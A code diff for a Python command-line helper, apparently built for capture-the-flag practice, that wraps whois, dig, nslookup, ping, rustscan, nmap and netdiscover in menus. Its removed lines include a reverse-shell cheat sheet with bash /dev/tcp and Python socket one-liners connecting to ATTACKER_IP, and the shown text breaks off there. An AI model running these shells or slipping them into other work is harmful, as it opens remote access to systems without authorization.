@@ -1,174 +1,508 @@
-# rich kutuphanesini unutma, sys, subprocess hatta os belki de bazen.
-# önce araçlar için fonksiyonlar yazılacak
-# sonra menü ve dil seçme fonksiyonları
-# en son CLI yazılacak rich ile derlersin
-#terminal cleaner eklenecek
-#son halinde welcome menüsü yazıldı, welcomedan input alınıp mainmenuye gecilmesi sağlanacak, main menü yapılacak ve modüller içerisinde toplanacak
-#birbirleriyle etkileşimleri oluşturulacak ve rich ile tekrardan menülerin üzeirnden geçilecek column row şeklinde bir oluşum düşünüyorum
+#fonksiyonlarda çalışmayanlar var john buga giriyor ona bakılacak, derlemeler ve kod mimarisi düzeltilecek
+#geri gitme ve ctrlc basınca uygulama içerisinde kalma her fonksiyona gelecek
 import subprocess
 import os
+import re
 from rich.console import Console
+from rich.table import Table
 from rich.text import Text
+from rich import print
+from rich import box
+from rich.panel import Panel
 import pyfiglet
 
+console = Console()
 
-# information gathering, whois , nslookup, whatweb, ping
+def clear_terminal():
+    os.system("clear")
 
 def run_whois():
-    print("whois is a widely used Internet record listing that identifies who owns a domain and how to get in contact with them.\n")
-    target = input("Enter the target domain or IP for whois lookup:\nkumCTF>")
+    value_error_count = 0
 
-    try:
-        result = subprocess.run(["whois", target], capture_output=True, text=True, check=True)
-        print(result.stdout)
-    except subprocess.CalledProcessError as e:
-        print("An error occured while running whois: ")
-        print(e)
+    while value_error_count < 3:
+        clear_terminal()
+        target = console.input("Enter the target domain or IP for whois lookup:\n[green]kumCTF[/green]>")
+
+        if not target:
+            value_error_count += 1
+            console.print(
+                f"[bold red]Invalid input![/bold red] Please provide a valid domain or IP. Attempts remaining: {3 - value_error_count}")
+            continue
+        try:
+            result = subprocess.run(["whois", target], capture_output=True, text=True, check=True)
+            console.print(f"[green]WHOIS lookup result for {target}:[/green]")
+            print(result.stdout)
+            break
+        except subprocess.CalledProcessError as e:
+            back = console.input(f"""[bold red]Error:[/bold red] An error occurred while running whois: {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                information_gathering()
+                break
+            value_error_count += 1
+        except Exception as e:
+            back = console.input(f"""[bold red]Unexpected error:[/bold red] {e}\n
+                Press (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>
+                """)
+            if back == 'b':
+                clear_terminal()
+                information_gathering()
+                break
+            value_error_count += 1
+
+    if value_error_count >= 3:
+        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
+        exit()
+
+    return
 
 def run_ping():
-    print("The Ping tool is used to test whether a particular host is reachable across an IP network.\n")
-    target = input("Enter the IP for pinging:\nkumCTF>")
-    try:
-        process = subprocess.Popen(
-            ["ping","-c","4",target],
-            stdout = subprocess.PIPE,
-            stderr = subprocess.STDOUT,
-            text=True
-        )
+    value_error_count = 0
 
-        for line in process.stdout:
-            print(line.strip())
+    while value_error_count < 3:
+        clear_terminal()
+        target = console.input("Enter the IP for pinging:\n[green]kumCTF[/green]>")
 
-        process.wait()
+        if not target:
+            value_error_count += 1
+            console.print(
+                f"[bold red]Invalid input![/bold red] Please provide a valid IP. Attempts remaining: {3 - value_error_count}")
+            continue
 
-    except subprocess.CalledProcessError as e:
-        print("An error occured while running ping: ")
-        print(e)
+        try:
+            process = subprocess.Popen(
+                ["ping", "-c", "4", target],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+
+            stdout, stderr = process.communicate()
+
+            # Hata mesajı varsa, gösterelim
+            if stderr:
+                console.print(f"[bold red]Error:[/bold red] {stderr.strip()}")
+                value_error_count += 1
+                continue
+
+            for line in stdout.splitlines():
+                console.print(line.strip())
+            process.wait()
+            break
+
+        except subprocess.CalledProcessError as e:
+            back = console.input(f"""[bold red]Error:[/bold red] An error occurred while running ping: {e}\n
+                Press (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>
+                """)
+            if back == 'b':
+                clear_terminal()
+                return
+            value_error_count += 1
+
+        except Exception as e:
+            back = console.input(f"""[bold red]Unexpected error:[/bold red] {e}\n
+                Press (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>
+                """)
+            if back == 'b':
+                clear_terminal()
+                information_gathering()
+                break
+            value_error_count += 1
+
+    if value_error_count >= 3:
+        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
+        exit()
+
+    return
+
 
 def run_dig():
-    print("The dig (domain information groper) command is a flexible tool for interrogating DNS name servers.\n")
-    target = input("Enter the target domain:\nkumCTF>")
+    value_error_count = 0
 
-    try:
-        result = subprocess.run(["dig", target],text=True,capture_output=True)
-        print(result.stdout)
-    except FileNotFoundError:
-        print("Couldn't find 'dig' in your system, please make sure it is installed in it.")
+    while value_error_count < 3:
+        clear_terminal()
+        target = console.input("Enter the target domain:\n[green]kumCTF[/green]>")
+
+        if not target:
+            value_error_count += 1
+            console.print(
+                f"[bold red]Invalid input![/bold red] Please provide a valid domain. Attempts remaining: {3 - value_error_count}")
+            continue
+
+        try:
+            result = subprocess.run(["dig", target], text=True, capture_output=True, check=True)
+            console.print(f"[bold green]Dig Result for {target}:[/bold green]\n")
+            console.print(result.stdout)
+            break
+
+        except FileNotFoundError:
+            console.print("\n[bold red]Error:[/bold red] Couldn't find 'dig' in your system, please make sure it is installed.")
+            break
+        except subprocess.CalledProcessError as e:
+            back = console.input(f"""[bold red]Error while running dig:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                information_gathering()
+                break
+            value_error_count += 1
+        except Exception as e:
+            back = console.input(f"""[bold red]Unexpected error:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                information_gathering()
+                break
+            value_error_count += 1
+
+    if value_error_count >= 3:
+        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
+        exit()
+    return
 
 def run_nslookup():
-    print("nslookup lets users enter a host name and find out the corresponding IP address or domain name system (DNS) record")
-    target = input("Target ip for reverse DNS lookup:\nkumCTF>")
+    value_error_count = 0
 
-    try:
-        result = subprocess.run(["nslookup", target],text=True,capture_output=True)
-        print(result.stdout)
-    except FileNotFoundError:
-        print("Couldn't find 'nslookup' in your system, please make sure it is installed in it")
+    while value_error_count < 3:
+        clear_terminal()
+        target = console.input("Target IP for reverse DNS lookup:\n[green]kumCTF>[/green] ")
 
-def file_back():
-    subprocess.run(["cd",".."],shell=True)
+        if not target:
+            value_error_count += 1
+            console.print(
+                f"[bold red]Invalid input![/bold red] Please provide a valid IP. Attempts remaining: {3 - value_error_count}")
+            continue
+
+        try:
+            result = subprocess.run(["nslookup", target], text=True, capture_output=True, check=True)
+            console.print(f"[bold green]NSLookup Result for {target}:[/bold green]\n")
+            console.print(result.stdout)
+            break
+        except FileNotFoundError:
+            back = console.input("""[bold red]Error:[/bold red] Couldn't find 'nslookup' in your system, please make sure it is installed.\nPress (b) to go back\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                information_gathering()
+                break
+        except subprocess.CalledProcessError as e:
+            back = console.input(f"""[bold red]Error while running nslookup:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                information_gathering()
+                break
+            value_error_count += 1
+        except Exception as e:
+            back = console.input(f"""[bold red]Unexpected error:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                information_gathering()
+                break
+            value_error_count += 1
+
+    if value_error_count >= 3:
+        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
+        exit()
+
+    return
+
 
 def information_gathering():
-    print("Welcome to infogatvsvsvs.\npleasechoosethetoolvsvsvs.")
+
+    console.print(
+        Panel(
+            "Information Gathering is the process of collecting and analyzing information about a target system. This can include identifying open ports, services, DNS records, and other crucial data.",
+            title="kumCTF - Info Gathering",
+            box=box.SQUARE,
+            border_style="green",
+            style="bold white",
+            padding=(1, 2),
+        )
+    )
+
+    table = Table(title="Select a Tool", box=box.HEAVY_EDGE, border_style="cyan",show_lines=True)
+    table.add_column("Tool", style="bold green")
+    table.add_column("Description", style="dim")
+
+    table.add_row("1-ping", "Tests network connectivity by sending ICMP echo requests to a target system.")
+    table.add_row("2-nslookup", "Queries DNS records to resolve domain names to IP addresses.")
+    table.add_row("3-dig", "A flexible DNS lookup tool used for querying DNS records with detailed output")
+    table.add_row("4-whois", "Retrieves domain registration information.")
+
+    console.print(table)
+
     value_error_count = 0
-    choice_error_count= 0
+    choice_error_count = 0
     while True:
         try:
-            tool = int(input("1-whois\n2-dig\n3-nslookup\n4-ping\n5-geri\nkumCTF>"))
+            tool = int(console.input("\nPlease choose a tool (1-4) or (5) back:\n[green]kumCTF[/green]>"))
         except ValueError:
-            print("Please enter a valid number")
-            value_error_count +=1
-            if value_error_count > 3:
-                print("Too many invalid attempts. Exiting...")
+            console.print("[red]Value error, please enter a number between (1-4)![/red]\n[green]kumCTF[/green]>")
+            value_error_count += 1
+            if value_error_count >= 3:
+                console.print("[red]Too many invalid values.Exiting...[/red]")
                 exit()
             continue
+
         match tool:
             case 1:
-                run_whois()
-                break
-            case 2:
-                run_dig()
-                break
-            case 3:
-                run_nslookup()
-                break
-            case 4:
+                console.print("\nRunning [cyan]Ping[/cyan]...")
                 run_ping()
-                break
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    information_gathering()
+                else:
+                    back_again = console.input("Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        information_gathering()
+            case 2:
+                console.print("\nRunning [cyan]Nslookup[/cyan]...")
+                run_nslookup()
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    information_gathering()
+                else:
+                    back_again = console.input("Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        information_gathering()
+            case 3:
+                console.print("\nRunning [cyan]Dig[/cyan]...")
+                run_dig()
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    information_gathering()
+                else:
+                    back_again = console.input("Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        information_gathering()
+            case 4:
+                console.print("\nRunning [cyan]Whois[/cyan]...")
+                run_whois()
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    information_gathering()
+                else:
+                    back_again = console.input("Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        information_gathering()
             case 5:
-                file_back()
-                break
+                print("\nGoing back...")
+                clear_terminal()
+                main_menu()
             case _:
-                print("Invalid choice try again!")
-                choice_error_count +=1
-                if choice_error_count > 3:
-                    print("Too many invalid attempts. Exiting...")
+                console.print("[red]Invalid choice, try again![/red]")
+                choice_error_count += 1
+                if choice_error_count >= 3:
+                    console.print("[red]Too many invalid choices. Exiting...[/red]")
                     exit()
                 continue
 
-
-#scanning toolları rustscan nmap netdiscover olarak aklımda var nmap için birkaç scan şekli vereceğim
 def scan_ports_with_rustscan():
-    print("Rustscan is a tool that helps us to find ports fastly.\n")
-    target = input("Please enter the target ip\nkumCTF>")
-    print(f"Starting fast port scan for {target}...\n")
+    value_error_count = 0
 
-    command = [
-        "rustscan",
-        "-a",target,
-        "--ulimit","5000"
-    ]
+    while value_error_count < 3:
+        clear_terminal()
+        target = console.input("Please enter the target IP:\n[green]kumCTF[/green]>")
 
-    try:
-        result = subprocess.run(command,capture_output=True,text=True)
+        if not target:
+            value_error_count += 1
+            console.print(
+                f"[bold red]Invalid input![/bold red] Please provide a valid IP. Attempts remaining: {3 - value_error_count}")
+            continue
 
-        print(f"[+] The output of scan:\n")
-        print(result.stdout)
+        console.print(f"Starting fast port scan for [green]{target}[/green]...\n")
 
-        if result.stderr:
-            print("[+] Error output:\n")
-            print(result.stderr)
+        command = [
+            "rustscan",
+            "-a", target,
+            "--ulimit", "5000"
+        ]
 
-    except Exception as e:
-        print(f"An error occured!{e}")
+        try:
+            result = subprocess.run(command, capture_output=True, text=True)
+
+            import re
+            output = result.stdout
+
+            clean_output = re.sub(r'\x1b\[[0-9;]*m', '', output)
+
+            lines = clean_output.splitlines()
+
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+            console.print("[bold cyan]🔍 RustScan Results - Target: [green]{}[/green][/bold cyan]".format(target))
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+
+            # Önemli bilgileri çıkar ve göster
+            open_ports = []
+            for line in lines:
+                if "Open" in line and not "Script" in line:
+                    port = line.strip()
+                    open_ports.append(port)
+                    console.print(f"[bold green]✅ {port}[/bold green]")
+
+            if not open_ports:
+                console.print("[yellow]⚠️ Couldn't find an open port![/yellow]")
+
+            if result.stderr:
+                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")
+
+            break
+
+        except subprocess.CalledProcessError as e:
+            back = console.input(
+                f"""[bold red]Error:[/bold red] An error occurred while running rustscan: {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                scanning()
+                break
+            value_error_count += 1
+
+        except Exception as e:
+            back = console.input(
+                f"""[bold red]Unexpected error:[/bold red] {e}\nPress (b) to go back or (any other key) to retry\n[green]kumCTF[/green]>""")
+            if back == 'b':
+                clear_terminal()
+                scanning()
+                break
+            value_error_count += 1
+
+    if value_error_count >= 3:
+        console.print("[bold red]Too many invalid attempts. Exiting...[/bold red]")
+        exit()
 
 def detailed_nmap_scan():
-    print("Nmap ('Network Mapper') is a free and open source utility for network discovery and security auditing.\n")
-    target = input("Please enter the target ip\nkumCTF>")
-    ports = input("Please enter the ports(80,443 if you dont give any port it will scan all of them)\nkumCTF>")
+    clear_terminal()
+    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+    console.print("[bold cyan]🔍 Detailed Nmap Scanner[/bold cyan]")
+    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
 
+    target = console.input("[yellow]Please enter the target IP:[/yellow]\n[green]kumCTF[/green]>")
+    if not target:
+        console.print("[bold red]Error:[/bold red] Target IP is required!")
+        return
+
+    ports = console.input(
+        "[yellow]Please enter the ports (e.g. 80,443) or leave empty to scan all ports:[/yellow]\n[green]kumCTF[/green]>")
 
     command = [
-        "nmap","-sC",
-        "-sV","-sS",
+        "nmap", "-sC",
+        "-sV", "-sS",
         "-O"
     ]
     if ports:
-        command.extend(["-p",ports])
+        command.extend(["-p", ports])
     command.append(target)
 
-    print("[+] Starting detailed nmap scan for the target ip(it may take some time)...")
+    console.print(f"[bold green]Starting detailed Nmap scan for [cyan]{target}[/cyan]...[/bold green]")
+    console.print("[yellow]This may take some time depending on the target and ports selected.[/yellow]")
 
     try:
-        result = subprocess.run(command,text=True,capture_output=True)
-        print(result.stdout)
-        if result.stderr:
-            print("[+] An error ocurred")
-            print(result.stderr)
+        #ilerleme cubuğu mu neydi o
+        with console.status("[bold green]Scanning in progress...[/bold green]", spinner="dots"):
+
+            result = subprocess.run(command, text=True, capture_output=True)
+
+            output = result.stdout
+
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+            console.print(f"[bold cyan]📊 Scan Results for [green]{target}[/green][/bold cyan]")
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+
+            lines = output.splitlines()
+            host_up = False
+            port_section = False
+            service_section = False
+            os_section = False
+
+            for line in lines:
+                if "Host is up" in line:
+                    host_up = True
+                    latency = line.split("(")[1].split(")")[0] if "(" in line else "unknown"
+                    console.print(f"[bold green]✅ Host is up[/bold green] - Latency: {latency}")
+
+                elif "/tcp" in line or "/udp" in line:
+                    if not port_section:
+                        port_section = True
+                        console.print("\n[bold cyan]🚪 Open Ports:[/bold cyan]")
+
+                    parts = line.split()
+                    if len(parts) >= 3:
+                        port = parts[0]
+                        state = parts[1]
+                        service = ' '.join(parts[2:])
+
+                        if "open" in state:
+                            console.print(f"[bold green]🟢 {port} - {service}[/bold green]")
+                        elif "filtered" in state:
+                            console.print(f"[yellow]🟠 {port} - {service}[/yellow]")
+                        else:
+                            console.print(f"[dim]{port} - {service}[/dim]")
+
+                elif "Service Info:" in line:
+                    if not service_section:
+                        service_section = True
+                        console.print("\n[bold cyan]🔧 Service Details:[/bold cyan]")
+                    console.print(f"[cyan]{line}[/cyan]")
+
+                elif "OS detection" in line or "OS details:" in line:
+                    if not os_section:
+                        os_section = True
+                        console.print("\n[bold cyan]💻 Operating System Detection:[/bold cyan]")
+                    console.print(f"[magenta]{line}[/magenta]")
+
+                elif line.startswith("|") and ":" in line:
+                    key = line.split(":", 1)[0] + ":"
+                    value = line.split(":", 1)[1]
+                    console.print(f"[yellow]{key}[/yellow]{value}")
+
+            for line in lines:
+                if "Nmap done:" in line:
+                    console.print(f"\n[cyan]{line}[/cyan]")
+
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+
+            if not host_up:
+                console.print("[bold red]⚠️ Host appears to be down or not responding.[/bold red]")
+
+            if result.stderr:
+                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")
+
+    except KeyboardInterrupt:
+        console.print("[bold yellow]Scan interrupted by user.[/bold yellow]")
+        return
     except Exception as e:
-        print(f"[+] An error occured {e}")
+        console.print(f"[bold red]An error occurred: {e}[/bold red]")
 
 def nmap_service_deteciton():
-    print("Detects the service&version on the target ip.")
-    target = input("Please enter the target ip:\nkumCTF>")
-    ports = input("Please enter the ports(like 22,80) if you don't it will scan all of the ports.\nkumCTF>")
+    clear_terminal()
+    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+    console.print("[bold cyan]🔍 Service & Version Scanner[/bold cyan]")
+    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+    console.print("Detects the service & version on the target IP.")
+
+    target = console.input("[yellow]Please enter the target IP:[/yellow]\n[green]kumCTF[/green]>")
 
     if not target:
-        print("[+] Error: Target ip is required!")
-    else:
-        print(f"[+] Running nmap(service&version detection) on {target} ....")
+        console.print("[bold red]Error:[/bold red] Target IP is required!")
+        return
 
-    command = ["nmap","-sV"]
+    ports = console.input(
+        "[yellow]Please enter the ports (like 22,80) if you don't it will scan all of the ports:[/yellow]\n[green]kumCTF[/green]>")
+
+    command = ["nmap", "-sV"]
 
     if ports:
         ports = ",".join([port.strip() for port in ports.split(',') if port.strip()])
@@ -178,242 +512,575 @@ def nmap_service_deteciton():
 
     command.append(target)
 
+    console.print(f"[bold green]Running service & version detection on [cyan]{target}[/cyan]...[/bold green]")
+    if not ports:
+        console.print("[yellow]Scanning all ports. This may take a while...[/yellow]")
+
     try:
-        result = subprocess.run(command,text=True,capture_output=True)
-        print(result.stdout)
+        with console.status("[bold green]Scanning in progress...[/bold green]", spinner="dots"):
+            result = subprocess.run(command, text=True, capture_output=True)
 
-        if result.stderr:
-            print("[+]An error occured")
-            print(result.stderr)
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+            console.print(f"[bold cyan]📊 Service Detection Results for [green]{target}[/green][/bold cyan]")
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
 
+            lines = result.stdout.splitlines()
+            port_table_started = False
+            found_services = False
+
+            for line in lines:
+                if "Host is up" in line:
+                    latency = line.split("(")[1].split(")")[0] if "(" in line else "unknown"
+                    console.print(f"[bold green]✅ Host is up[/bold green] - Latency: {latency}")
+
+                elif "PORT" in line and "STATE" in line and "SERVICE" in line:
+                    port_table_started = True
+                    console.print("\n[bold cyan]🚪 Detected Services:[/bold cyan]")
+                    console.print(f"[bold]{'PORT':<10} {'STATE':<10} {'SERVICE':<15} {'VERSION':<}[/bold]")
+
+                elif port_table_started and ("/tcp" in line or "/udp" in line):
+                    found_services = True
+                    parts = line.split(None, 3)  # Split into max 4 parts
+
+                    if len(parts) >= 3:
+                        port = parts[0]
+                        state = parts[1]
+                        service = parts[2]
+                        version = parts[3] if len(parts) > 3 else ""
+
+                        if state == "open":
+                            console.print(f"[green]{port:<10} {state:<10} {service:<15} {version:<}[/green]")
+                        elif state == "filtered":
+                            console.print(f"[yellow]{port:<10} {state:<10} {service:<15} {version:<}[/yellow]")
+                        else:
+                            console.print(f"[dim]{port:<10} {state:<10} {service:<15} {version:<}[/dim]")
+
+            for line in lines:
+                if "service detection performed" in line.lower():
+                    console.print(f"\n[cyan]{line}[/cyan]")
+
+            if not found_services:
+                console.print("[yellow]⚠️ No open services detected.[/yellow]")
+
+            console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+
+            if result.stderr:
+                console.print(f"[bold red]Error output:[/bold red]\n{result.stderr}")
+
+    except KeyboardInterrupt:
+        console.print("[bold yellow]Scan interrupted by user.[/bold yellow]")
     except Exception as e:
-        print(f"[+] An error occured {e}")
+        console.print(f"[bold red]An error occurred: {e}[/bold red]")
 
 
 def run_netdiscover():
-    print("Netdiscover is a tool used for active network discovery.")
+    clear_terminal()
+    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+    console.print("[bold cyan]🔍 Network Discovery Scanner[/bold cyan]")
+    console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
 
-    network_range = input("Enter the network range (e.g., 10.0.2.0/24):\nkumCTF> ")
-    print(f"[+] Running netdiscover on the {network_range} network....")
+    network_range = console.input(
+        "[yellow]Enter the network range (e.g., 10.0.2.0/24):[/yellow]\n[green]kumCTF[/green]> ")
 
-    process = None  # process'i burada başlatıyoruz, böylece her yerde kullanabiliriz
+    if not network_range:
+        console.print("[bold red]Error:[/bold red] Network range is required!")
+        return
+
+    console.print(f"[bold green]Running network discovery on [cyan]{network_range}[/cyan]...[/bold green]")
+    console.print("[yellow]Press Ctrl+C to stop the scan at any time.[/yellow]\n")
+
+    process = None
+    hosts_found = []
 
     try:
-        command = ["sudo", "netdiscover", "-r", network_range]
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1,
-                                   universal_newlines=True)
+        command = ["sudo", "netdiscover", "-r", network_range, "-P"]
+
+        console.print("[bold]IP Address      MAC Address        Vendor[/bold]")
+        console.print("[dim]──────────────────────────────────────────────────[/dim]")
+
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                   bufsize=1, universal_newlines=True)
 
         for line in process.stdout:
-            print(line, end='')
+            line = line.strip()
+
+            if not line or "Currently scanning" in line or "--------------------------------------------------------" in line:
+                continue
+
+            parts = line.split()
+            if len(parts) >= 5 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0]):
+                ip_addr = parts[0]
+                mac_addr = parts[1]
+                vendor = ' '.join(parts[4:]) if len(parts) > 4 else "Unknown"
+
+                hosts_found.append((ip_addr, mac_addr, vendor))
+
+                console.print(f"[green]{ip_addr:<15} [blue]{mac_addr:<18} [yellow]{vendor}[/yellow]")
 
         process.stdout.close()
         process.wait()
 
+        console.print("\n[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+        console.print(f"[bold green]✅ Network discovery completed![/bold green]")
+        console.print(f"[cyan]Total hosts found: {len(hosts_found)}[/cyan]")
+        console.print("[bold blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold blue]")
+
     except KeyboardInterrupt:
-        print("\n[+] Netdiscover operation was interrupted by the user.")
-        if process:
-            process.terminate()  # Eğer process varsa, terminate et
-        scanning()  # scanning fonksiyonunu çağırıyoruz
-        return
-    except Exception as e:
-        print(f"[+] An error occurred: {e}")
+        console.print("\n[yellow]⚠️ Network discovery was interrupted by the user.[/yellow]")
+        clear_terminal()
         if process:
             process.terminate()
-        scanning()
-        return
+    except Exception as e:
+        console.print(f"[bold red]An error occurred: {e}[/bold red]")
+        if process:
+            process.terminate()
 
-    print("[+] Netdiscover scan completed!")
     scanning()
 
-
 def scanning():
-    print("Welcome to scanning\npleasechoosetoolvs.")
+    console.print(
+        Panel(
+            """Scanning is the process of identifying live hosts, open ports, and running services on a target system or network.
+It helps to gather detailed technical information that can be used for further analysis or exploitation.\nThis part is beautified for you to understand more easily hope you like it.""",
+            title="[green]kumCTF[/green] - Scanning",
+            box=box.SQUARE,
+            border_style="blue",
+            style="bold white",
+            padding=(1, 2),
+        )
+    )
+
+    table = Table(title="Select a Tool", box=box.HEAVY_EDGE, border_style="blue",show_lines=True)
+    table.add_column("Tool", style="blue")
+    table.add_column("Description", style="dim")
+
+    table.add_row("1-Netdiscover", "Quickly discover live hosts on a local network using ARP requests.")
+    table.add_row("2-Rustscan", "Extremely fast port scanner to identify open ports efficiently.")
+    table.add_row("3-Nmap Detailed Scan", "Perform SYN scan, service and version detection, script scanning, and OS detection for full analysis.")
+    table.add_row("4-Nmap Server & Version Deteciton", "Identify running services and their versions on open ports.")
+
+    console.print(table)
+
     value_error_count = 0
     choice_error_count = 0
     while True:
         try:
-            tool = int(input("1-netdiscover\n2-rustscan\n3-nmap(server&service detection)\n4-nmap detailed scan\n5-back\nkumCTF>"))
+            tool = int(console.input("\nPlease choose a tool (1-4) or (5) back:\n[green]kumCTF[/green]>"))
         except ValueError:
-            print("Please enter a valid number")
+            console.print("[red]Value error, please enter a number between (1-4)![/red]\n[green]kumCTF[/green]>")
             value_error_count += 1
             if value_error_count >= 3:
-                print("Too many invalid attempts. Exiting...")
+                console.print("[red]Too many invalid values.Exiting...[/red]")
                 exit()
             continue
 
         match tool:
             case 1:
+                console.print("\nRunning [cyan]Netdiscover[/cyan]...")
                 run_netdiscover()
-                break
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    scanning()
+                else:
+                    back_again = console.input(
+                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        scanning()
             case 2:
+                console.print("\nRunning [blue]Rustscan[/blue]...")
                 scan_ports_with_rustscan()
-                break
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    scanning()
+                else:
+                    back_again = console.input(
+                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        scanning()
             case 3:
-                nmap_service_deteciton()
-                break
-            case 4:
+                console.print("\nRunning [blue]Detailed Nmap Scan[/blue]...")
                 detailed_nmap_scan()
-                break
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    scanning()
+                else:
+                    back_again = console.input(
+                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        scanning()
+            case 4:
+                console.print("\nRunning [blue]Nmap version & service[/blue]...")
+                nmap_service_deteciton()
+                back = console.input("Press (b) to go back\n[green]kumCTF[/green]>")
+                if back == 'b':
+                    clear_terminal()
+                    scanning()
+                else:
+                    back_again = console.input(
+                        "Press [yellow](b)[/yellow] please,or the system will [bold red]kick[/bold red] you!!!\n[green]kumCTF[/green]>")
+                    if back_again != 'b':
+                        exit()
+                    else:
+                        clear_terminal()
+                        scanning()
             case 5:
-                file_back()
-                break
+                print("\nGoing back...")
+                clear_terminal()
+                main_menu()
             case _:
-                print("Invalid choice, try again!")
-                choice_error_count +=1
+                console.print("[red]Invalid choice, try again![/red]")
+                choice_error_count += 1
                 if choice_error_count >= 3:
-                    print("Too many invalid attempts. Exiting...")
+                    console.print("[red]Too many invalid choices. Exiting...[/red]")
                     exit()
                 continue
 
-def show_reverse_shells():
-    reverse_shells = {
-        "1": {
-            "name": "Bash Reverse Shell",
-            "code": "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
-        },
-        "2": {
-            "name": "Python Reverse Shell",
-            "code": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
-        },
-        "3": {
-            "name": "PHP Reverse Shell",
